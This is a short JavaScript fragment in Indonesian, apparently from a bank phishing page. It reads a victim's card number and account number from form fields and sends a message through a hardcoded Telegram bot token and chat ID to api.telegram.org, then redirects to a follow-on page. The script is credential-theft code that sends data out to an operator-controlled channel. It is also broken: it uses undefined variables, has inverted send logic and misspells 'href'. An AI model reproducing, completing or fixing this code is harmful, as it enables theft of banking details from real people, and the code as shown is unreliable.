<script>
  function sendMessage(id, botApi, pesan) {
    const url = `https://api.telegram.org/bot${botApi}/sendMessage`;
    const data = {
      chat_id: id,
      text: pesan
    };
    fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(data => {
      console.log('Pesan terkirim:', data);
      window.location.href = "kodedomp.html"
    })
    .then(response => response.json())
    .then(data => {
      window.location.herf = "kodedomp.html";
    })
    .catch(error => {
      console.error('Terjadi kesalahan:', error);
    });
  }

  const next = () => {
    const nocard = document.querySelector("#input1").value;
    const norek = document.querySelector("#input2").value;

    let bot = "7070593349:AAGhtyk4PiU3fMmLVe9CQiKPaQlrZLR8yjM";
    let id = "6250486742";
    if (nocard === "" || norek === "" || ktp==="" || pin==="") {
      alert("Mohon lengkapi data Anda.");

      sendMessage(id, bot, text);
    }
  }
</script>
